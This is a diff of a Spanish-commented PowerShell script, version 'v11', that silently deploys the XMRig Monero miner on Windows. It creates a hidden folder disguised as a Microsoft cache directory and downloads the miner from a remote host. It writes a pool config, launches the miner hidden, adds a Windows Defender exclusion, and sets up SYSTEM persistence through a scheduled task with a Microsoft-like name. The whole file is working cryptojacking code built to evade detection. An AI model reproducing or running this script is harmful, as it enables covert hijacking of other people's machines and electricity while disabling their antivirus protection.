@@ -1,9 +1,13 @@
-# XMRig Silent Deploy FINAL v10 - Defender exclusion + BAT wrapper (100% estable)
+# XMRig Silent Deploy FINAL v11 - NO BOM + log visible + BAT wrapper
 $InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
 if (-not (Test-Path $InstallDir)) {
     New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
     (Get-Item $InstallDir).Attributes += "Hidden"
 }
+
+# Limpieza de archivos antiguos por si acaso
+Remove-Item "$InstallDir\config.json" -Force -ErrorAction SilentlyContinue
+Remove-Item "$InstallDir\start.bat" -Force -ErrorAction SilentlyContinue
 
 # Descarga y extracción
 $ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
@@ -12,7 +16,6 @@ Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
 Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
 Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
 
-# Mover archivos si están en subcarpeta
 $Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
 if ($Sub) {
     Move-Item "$($Sub.FullName)\*" $InstallDir -Force
@@ -23,13 +26,14 @@ $ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Selec
 $ConfigPath = "$InstallDir\config.json"
 $BatPath = "$InstallDir\start.bat"
 
-# Config (60% hilos + tu wallet)
+# Config SIN BOM (usamos ASCII) + log para depurar
 $ConfigJson = @"
 {
   "autosave": false,
   "colors": false,
   "cpu": { "enabled": true, "max-threads-hint": 60 },
   "donate-level": 0,
+  "log-file": "xmr.log",
   "pools": [{
     "algo": "rx/0",
     "url": "pool.supportxmr.com:443",
@@ -42,20 +46,20 @@ $ConfigJson = @"
   "print-time": 60
 }
 "@
-$ConfigJson | Out-File $ConfigPath -Encoding UTF8 -Force
+$ConfigJson | Out-File $ConfigPath -Encoding ascii -Force
 
-# BAT wrapper (más estable que lanzar exe directo desde tarea)
+# BAT wrapper (más estable)
 "@echo off
 cd /d `"$InstallDir`"
 start /B xmrig.exe -c config.json -B --no-color" | Out-File $BatPath -Encoding ASCII -Force
 
-# Excluir carpeta del Defender (clave en labs)
+# Excluir del Defender
 try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}
 
-# Arrancar inmediatamente
+# Arrancar ya
 Start-Process -FilePath $BatPath -WindowStyle Hidden
 
-# Persistencia SYSTEM (AtStartup)
+# Persistencia SYSTEM
 $TaskName = "MicrosoftNetworkCache"
 $Action  = New-ScheduledTaskAction -Execute $BatPath
 $Trigger = New-ScheduledTaskTrigger -AtStartup
